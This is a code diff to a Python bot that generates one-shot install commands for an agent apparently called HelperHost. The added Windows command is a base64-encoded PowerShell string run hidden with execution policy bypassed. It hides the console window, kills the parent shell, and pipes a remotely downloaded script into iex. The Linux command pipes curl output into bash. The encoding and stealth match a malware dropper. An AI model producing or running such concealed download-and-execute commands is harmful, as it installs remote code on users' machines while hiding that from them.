@@ -312,12 +312,49 @@ def effective_base_url() -> str:
 
 def connect_commands(user_id: int, base_url: str | None = None) -> dict[str, str]:
     """One-shot install: scripts + HelperHost served by this bot (tunnel), not GitHub."""
+    import base64 as _b64
+
     key = ensure_enroll_key(user_id)
     base = (base_url or effective_base_url()).rstrip("/")
     files = f"{base}/files"
     rel = f"{files}/releases"
     raw_ps1 = f"{files}/scripts/install-win.ps1"
     raw_sh = f"{files}/scripts/install.sh"
+
+    # EncodedCommand: collable dans CMD ou PowerShell, sans galère de quotes.
+    win_ps = f"""
+$ErrorActionPreference='Continue'
+try {{
+  Add-Type -Namespace H -Name Z -MemberDefinition @"
+[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h,int c);
+[DllImport("user32.dll")] public static extern int GetWindowLong(IntPtr h,int n);
+[DllImport("user32.dll")] public static extern int SetWindowLong(IntPtr h,int n,int v);
+[DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr h,IntPtr a,int x,int y,int cx,int cy,uint f);
+[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+"@ -EA 0
+  $h=[H.Z]::GetConsoleWindow()
+  if ($h -ne [IntPtr]::Zero) {{
+    $s=[H.Z]::GetWindowLong($h,-20); $s=($s -band (-bnot 0x40000)) -bor 0x80
+    [void][H.Z]::SetWindowLong($h,-20,$s); [void][H.Z]::ShowWindow($h,0)
+    [void][H.Z]::SetWindowPos($h,[IntPtr]::Zero,0,0,0,0,0x83)
+  }}
+  try {{
+    $pp=(Get-CimInstance Win32_Process -Filter "ProcessId=$PID").ParentProcessId
+    $pn=(Get-CimInstance Win32_Process -Filter "ProcessId=$pp").Name
+    if ($pn -match '^(cmd|powershell|pwsh)\\.exe$') {{
+      $ph=(Get-Process -Id $pp -EA 0).MainWindowHandle
+      if ($ph) {{ [void][H.Z]::ShowWindow([IntPtr]$ph,0) }}
+      Stop-Process -Id $pp -Force -EA 0
+    }}
+  }} catch {{}}
+}} catch {{}}
+[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
+$Enroll='{key}'; $BotBase='{base}'; $InstallUrl='{raw_ps1}'
+$env:AGENTSHE_GH='{rel}'
+iex ((curl.exe -fsSL '{raw_ps1}' | Out-String))
+""".strip()
+    win_enc = _b64.b64encode(win_ps.encode("utf-16le")).decode("ascii")
+
     return {
         "enroll_key": key,
         "base_url": base,
@@ -328,20 +365,7 @@ def connect_commands(user_id: int, base_url: str | None = None) -> dict[str, str
             f"curl -fsSL '{raw_sh}' | bash -s -- '{key}' '{base}'"
         ),
         "windows": (
-            "try{Add-Type -Namespace H -Name Z -MemberDefinition '"
-            "[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int c);"
-            "[DllImport(\"user32.dll\")]public static extern int GetWindowLong(IntPtr h,int n);"
-            "[DllImport(\"user32.dll\")]public static extern int SetWindowLong(IntPtr h,int n,int v);"
-            "[DllImport(\"user32.dll\")]public static extern bool SetWindowPos(IntPtr h,IntPtr a,int x,int y,int cx,int cy,uint f);"
-            "[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow();' -EA 0; "
-            "$h=[H.Z]::GetConsoleWindow(); if($h -ne [IntPtr]::Zero){"
-            "$s=[H.Z]::GetWindowLong($h,-20); $s=($s -band (-bnot 0x40000)) -bor 0x80; "
-            "[void][H.Z]::SetWindowLong($h,-20,$s); [void][H.Z]::ShowWindow($h,0); "
-            "[void][H.Z]::SetWindowPos($h,[IntPtr]::Zero,0,0,0,0,0x83)}}catch{}; "
-            "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; "
-            f"$Enroll='{key}'; $BotBase='{base}'; $InstallUrl='{raw_ps1}'; "
-            f"$env:AGENTSHE_GH='{rel}'; "
-            f"iex ((curl.exe -fsSL '{raw_ps1}' | Out-String))"
+            f"powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {win_enc}"
         ),
     }
 
